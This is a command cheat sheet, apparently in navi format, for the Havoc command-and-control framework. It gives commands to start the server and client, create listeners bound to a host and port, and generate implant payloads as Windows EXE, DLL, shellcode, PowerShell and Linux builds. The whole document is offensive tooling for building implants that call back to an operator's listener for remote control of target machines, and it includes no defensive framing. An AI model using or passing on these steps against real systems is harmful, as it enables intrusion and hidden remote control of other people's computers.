# Havoc

## setup

### Start server

Start server with Havoc.

Start the Havoc server.

```sh title:"Havoc Start Server"
sudo ./havoc server
```
<!-- cheat -->

### Start client

Start client with Havoc.

Start the Havoc client.

```sh title:"Havoc Start Client"
./havoc client
```
<!-- cheat -->

### Create listener

Create listener with Havoc.

Create a listener.

```sh title:"Havoc Create Listener"
havoc listener --name "$listener_name" --host "$lhost" --port "$lport"
```
<!-- cheat
var listener_name
var lhost
var lport
-->

### List listeners

List listeners with Havoc.

List available listeners.

```sh title:"Havoc List Listeners"
havoc listener --list
```
<!-- cheat -->

## payloads

### Windows EXE

Generate windows EXE with Havoc.

Generate a Windows EXE payload.

```sh title:"Havoc Generate Windows EXE"
havoc payload --listener "$listener_name" --format exe --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Windows DLL

Generate windows DLL with Havoc.

Generate a Windows DLL payload.

```sh title:"Havoc Generate Windows DLL"
havoc payload --listener "$listener_name" --format dll --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Shellcode

Spawn shellcode with Havoc.

Generate shellcode.

```sh title:"Havoc Spawn Shellcode"
havoc payload --listener "$listener_name" --format shellcode --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### PowerShell

Spawn PowerShell with Havoc.

Generate a PowerShell payload.

```sh title:"Havoc Spawn PowerShell"
havoc payload --listener "$listener_name" --format powershell --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Linux

Generate linux with Havoc.

Generate a Linux payload.

```sh title:"Havoc Generate Linux"
havoc payload --listener "$listener_name" --format linux --output "$output_file"
```
<!-- cheat
var listener_name
var output_file
-->

### Formats

List formats with Havoc.

List available payload formats.

```sh title:"Havoc List Formats"
havoc payload --formats
```
<!-- cheat -->
